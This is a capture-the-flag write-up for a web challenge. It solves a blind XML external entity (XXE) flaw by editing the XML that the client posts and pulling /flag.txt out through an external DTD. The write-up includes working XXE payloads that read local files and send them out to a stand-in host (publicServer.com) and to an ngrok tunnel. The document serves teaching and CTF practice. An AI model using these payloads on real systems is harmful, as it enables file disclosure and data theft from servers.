# KCSC TTV 2023/Web/XXD

![](https://i.imgur.com/jzZJaj0.png)

## Solution

![](https://i.imgur.com/Ix1R31q.png)

After fill in information and submit. At the client side, informations are handled and POST to the server with XML format. 

Because POST XML is handled at client side, we can modify this.

![](https://i.imgur.com/fBlOmW3.png)

Depend on first hint: 

![](https://i.imgur.com/aZnjS8O.png)

We access XXE payload of [Payload All The Thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)

Because the response don't show information, we need to use `OOB (data out-of-band)`

And then I found that payload:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

Depend on second hint to modify our payload:

![](https://i.imgur.com/7iUJMXn.png)

First step is use php build local server:

![](https://i.imgur.com/3XpR29C.png)

And then use ngrok to create tunnel from our local to internet:

![](https://i.imgur.com/0TkVDJI.png)


Second step is create `dtd.xml` file:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://bf4e-104-28-254-75.ap.ngrok.io/dtd.xml?%data;'>">
```
- We have to use `convert.base64-encode` because flag contain special characters
- Modify the link to our server to determine variable `&exfil` is called and this is the way to receive data from variable `%data`, which contains content flag.txt

Last step is modify XML POST request:

```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data [ 
<!ELEMENT data ANY >
<!ENTITY % sp SYSTEM "https://bf4e-104-28-254-75.ap.ngrok.io/dtd.xml"> 
%sp; 
%param1; 
]>
<data>
    <name>
        &exfil;
    </name>
    ...
</data>
```

Send that request and check on server php local:

![](https://i.imgur.com/N6pUTPa.png)

Copy that then decode base64:

![](https://i.imgur.com/2FFH4wB.png)

Flag: **KCSC{blind_xxD_xxO_xx]_xxe!!@#@}**